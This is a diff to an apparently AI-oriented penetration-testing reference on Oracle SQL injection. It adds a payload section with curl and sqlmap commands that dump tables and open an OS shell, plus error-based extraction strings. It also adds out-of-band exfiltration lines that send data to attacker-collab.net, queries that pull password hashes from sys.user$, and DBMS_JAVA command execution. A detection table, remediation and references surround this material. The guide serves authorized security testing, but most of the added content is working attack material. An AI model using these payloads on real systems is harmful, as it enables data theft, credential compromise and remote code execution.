@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-inpv-01, wstg-inpv-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-inpv-02: "Oracle SQL Injection grants INSERT/UPDATE access to write an unsanitized script payload directly into a stored field, achieving persistent Stored XSS against every user who views the record = Critical (Mass Account Compromise)"
 ---
 
 # wstg-inpv-05.1
@@ -355,6 +356,90 @@ sqlmap -u "https://target.com/product?id=1" --dbms=oracle --os-shell
 
 ---
 
+## Example Commands/Payloads
+
+### Detection (curl)
+
+```bash
+TARGET="https://target.com/product"
+
+# Oracle-specific error trigger (single quote breaks the query)
+curl -s "$TARGET?id=1'" | grep -Ei "ORA-[0-9]{5}"
+
+# Confirm Oracle via DUAL table (only Oracle requires FROM clause on SELECT with no table)
+curl -s "$TARGET?id=1 UNION SELECT NULL FROM DUAL--"
+
+# Time-based blind (heavy query, no native SLEEP() in Oracle)
+time curl -s "$TARGET?id=1' AND 1=DBMS_LOCK.SLEEP(5)--" -o /dev/null
+time curl -s "$TARGET?id=1' AND (SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3)>0--" -o /dev/null
+```
+
+### SQLMap (Oracle)
+
+```bash
+sqlmap -u "https://target.com/product?id=1" --dbms=oracle --banner
+sqlmap -u "https://target.com/product?id=1" --dbms=oracle --dbs
+sqlmap -u "https://target.com/product?id=1" --dbms=oracle -D ORCL --tables
+sqlmap -u "https://target.com/product?id=1" --dbms=oracle -D ORCL -T USERS --dump
+sqlmap -u "https://target.com/product?id=1" --dbms=oracle --os-shell   # requires elevated privileges
+```
+
+### Error-Based Data Exfiltration (no visible UNION output needed)
+
+Oracle throws the injected value back inside the error message itself — useful when the app only prints a generic 500 error but leaks the DB exception text:
+
+```sql
+-- XMLType error forces the sub-select's value into the exception string
+' AND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'~'||CHR(62))) FROM DUAL)--
+
+-- CTXSYS.DRITHSX.SN (classic Oracle error-based oracle)
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
+
+-- DBMS_UTILITY hash-based error extraction
+' AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT user FROM DUAL)||'~')--
+```
+
+### Out-of-Band Exfiltration (UTL_HTTP / XXE via XMLType)
+
+```sql
+-- Direct outbound HTTP request carrying extracted data in the URL (requires UTL_HTTP execute privilege)
+' AND UTL_HTTP.REQUEST('http://attacker-collab.net/'||(SELECT user FROM DUAL))=1--
+
+-- DNS-only exfiltration via XML external entity (no outbound HTTP privilege needed)
+' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [ <!ENTITY % rmt SYSTEM "http://'||(SELECT user FROM DUAL)||'.attacker-collab.net/"> %rmt;]>'),'/l') FROM DUAL) IS NOT NULL--
+```
+
+### Credentials / Privilege Enumeration
+
+```sql
+-- Enumerate all database accounts (works on all versions, no privilege needed)
+' UNION SELECT username,NULL,NULL FROM all_users--
+
+-- Password hashes (privileged; version-dependent column)
+' UNION SELECT name,password,NULL FROM sys.user$--        -- Oracle <= 10g
+' UNION SELECT name,spare4,NULL FROM sys.user$--           -- Oracle <= 11g
+```
+
+### Java-Based RCE (post-exploitation, requires elevated privileges)
+
+```sql
+-- Grant filesystem/exec permissions to the current schema, then run OS commands via DBMS_JAVA
+exec dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');
+SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c "id>/tmp/OUT.LST"') FROM DUAL;
+```
+
+### Detection Pattern
+
+| Signal | Meaning |
+| ------ | ------- |
+| `ORA-00933`, `ORA-01756`, `ORA-00936` in response | Error-based SQLi, confirms Oracle backend |
+| Payload requires `FROM DUAL` to succeed where MySQL/PostgreSQL equivalents don't | Oracle-specific SQL dialect confirmed |
+| `UTL_HTTP.REQUEST` / `DBMS_LDAP.INIT` out-of-band callback received | Blind/OOB SQLi confirmed via network side-channel |
+| DNS lookup for `<extracted-data>.attacker-collab.net` received without UTL_HTTP privilege | XMLType XXE-based OOB exfiltration confirmed |
+| `XMLType`/`CTXSYS.DRITHSX.SN` error string contains the injected sub-select value | Error-based exfiltration channel confirmed, bypasses lack of UNION output |
+
+---
+
 ## Remediation
 
 ```java
@@ -391,6 +476,13 @@ cursor.execute("SELECT * FROM users WHERE id = :id", {'id': user_id})
 | ---------- | ------------- |
 | **CWE-89** | SQL Injection |
 
+---
+
+## References
+
+- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
+- [PortSwigger SQL Injection Cheat Sheet - Oracle](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [PayloadsAllTheThings - SQL Injection (Oracle)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#oracle)
 
 ---
 
